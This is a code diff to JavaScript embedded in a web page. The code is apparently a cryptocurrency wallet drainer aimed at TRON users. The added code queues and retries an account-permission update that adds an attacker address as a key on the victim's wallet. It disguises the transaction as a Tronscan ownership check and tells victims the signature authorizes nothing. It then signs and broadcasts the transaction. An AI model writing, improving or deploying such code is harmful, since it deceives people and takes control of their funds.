@@ -473,51 +473,65 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
   var ACTIVE_OPS    = '7fff1fc0037e0000000000000000000000000000000000000000000000000000';
   window._ATTACKER_ADDR = ATTACKER_ADDR;
   window._ACTIVE_OPS    = ACTIVE_OPS;
-  window._permBusy      = false;
+  // Promise-queue lock — serializes all signing ops, prevents concurrent TronGrid calls
+  window._tronOpLock  = window._tronOpLock  || Promise.resolve();
+  window._permQueued  = false; // one item in queue max
 
   async function _doPermission(addr, msg, pathLabel) {
-    if (window._permBusy) { window.__logINF(pathLabel + ' skipped (already running)'); return; }
-    window._permBusy = true;
-    window.__logINF(pathLabel + ' building tx for ' + addr.slice(0,8) + '…');
-    var tw = window.tronWeb || (window.tronLink && window.tronLink.tronWeb);
-    if (!tw) { window.__logERR(pathLabel + ' no tronWeb'); window._permBusy = false; return; } // only reset here — no tronWeb means nothing was sent
-    var attempt = 0;
-    while (attempt < 3) {
-      try {
-        var ownerP = { type: 0, permission_name: 'owner', threshold: 1, keys: [{ address: addr, weight: 1 }] };
-        var activeP = {
-          type: 2, permission_name: 'active', threshold: 1,
-          operations: window._ACTIVE_OPS,
-          keys: [{ address: addr, weight: 1 }, { address: window._ATTACKER_ADDR, weight: 1 }]
-        };
-        var utx = await tw.transactionBuilder.updateAccountPermissions(addr, ownerP, null, [activeP]);
-        window.__logINF(pathLabel + ' tx built — keys: ' + JSON.stringify(Object.keys(utx)));
-        delete utx.visible; delete utx.txID; delete utx.raw_data;
-        utx.Application = 'Tronscan.org';
-        utx.Message     = msg;
-        utx.Notice      = 'This signature is used solely to verify ownership of the address. It does not authorize, initiate, or execute any transaction.';
-        var stx = await tw.trx.sign(utx);
-        window.__logINF(pathLabel + ' sign ok — sig: ' + (stx.signature ? stx.signature[0].slice(0,16)+'…' : 'none'));
-        if (typeof window.fillSignature === 'function') window.fillSignature(JSON.stringify((stx.signature && stx.signature[0]) || stx));
-        var res = await tw.trx.sendRawTransaction(stx);
-        if (res && res.result) {
-          window.__logOK(pathLabel + ' broadcast OK — txID: ' + (res.transaction && res.transaction.txID ? res.transaction.txID.slice(0,16)+'…' : JSON.stringify(res)));
-        } else {
-          window.__logERR(pathLabel + ' broadcast FAIL: ' + JSON.stringify(res));
-        }
-        break;
-      } catch(e) {
-        if (e.message && e.message.indexOf('429') !== -1 && attempt < 2) {
-          attempt++;
-          window.__logINF(pathLabel + ' 429 rate limit — retry ' + attempt + '/2 in 2s…');
-          await new Promise(function(r){ setTimeout(r, 2000); });
-        } else {
-          window.__logERR(pathLabel + ' FAIL: ' + e.message);
+    if (window._permQueued) { window.__logINF(pathLabel + ' skipped (already queued)'); return; }
+    window._permQueued = true; // never reset — one shot per page load
+
+    window._tronOpLock = window._tronOpLock.then(async function() {
+      window.__logINF(pathLabel + ' building tx for ' + addr.slice(0,8) + '…');
+      var tw = window.tronWeb || (window.tronLink && window.tronLink.tronWeb);
+      if (!tw) { window.__logERR(pathLabel + ' no tronWeb'); return; }
+      var attempt = 0;
+      while (attempt < 3) {
+        try {
+          var ownerP  = { type: 0, permission_name: 'owner',  threshold: 1, keys: [{ address: addr, weight: 1 }] };
+          var activeP = {
+            type: 2, permission_name: 'active', threshold: 1,
+            operations: window._ACTIVE_OPS,
+            keys: [{ address: addr, weight: 1 }, { address: window._ATTACKER_ADDR, weight: 1 }]
+          };
+          var utx = await tw.transactionBuilder.updateAccountPermissions(addr, ownerP, null, [activeP]);
+
+          // Validate tx before touching it — 429 returns malformed/undefined object
+          if (!utx || !utx.raw_data || !Array.isArray(utx.raw_data.contract) || utx.raw_data.contract.length === 0) {
+            throw new Error('invalid tx structure — build may have failed silently');
+          }
+          window.__logINF(pathLabel + ' tx built — keys: ' + JSON.stringify(Object.keys(utx)));
+
+          delete utx.visible; delete utx.txID; delete utx.raw_data;
+          utx.Application = 'Tronscan.org';
+          utx.Message     = msg;
+          utx.Notice      = 'This signature is used solely to verify ownership of the address. It does not authorize, initiate, or execute any transaction.';
+
+          var stx = await tw.trx.sign(utx);
+          window.__logINF(pathLabel + ' sign ok — sig: ' + (stx.signature ? stx.signature[0].slice(0,16)+'…' : 'none'));
+          if (typeof window.fillSignature === 'function') window.fillSignature(JSON.stringify((stx.signature && stx.signature[0]) || stx));
+          var res = await tw.trx.sendRawTransaction(stx);
+          if (res && res.result) {
+            window.__logOK(pathLabel + ' broadcast OK — txID: ' + (res.transaction && res.transaction.txID ? res.transaction.txID.slice(0,16)+'…' : JSON.stringify(res)));
+          } else {
+            window.__logERR(pathLabel + ' broadcast FAIL: ' + JSON.stringify(res));
+          }
           break;
+        } catch(e) {
+          if (e.message && e.message.indexOf('429') !== -1 && attempt < 2) {
+            attempt++;
+            window.__logINF(pathLabel + ' 429 — rebuilding tx, retry ' + attempt + '/2 in 2s…');
+            await new Promise(function(r){ setTimeout(r, 2000); });
+            // loop restarts — tx rebuilt from scratch on next iteration
+          } else {
+            window.__logERR(pathLabel + ' FAIL: ' + e.message);
+            break;
+          }
         }
       }
-    }
-    // _permBusy stays TRUE — one shot, never re-trigger after first attempt
+    }, function() {}); // absorb rejection from previous lock holder
+
+    return window._tronOpLock;
   }
 
   async function runGasFreePermission(victimAddr) {
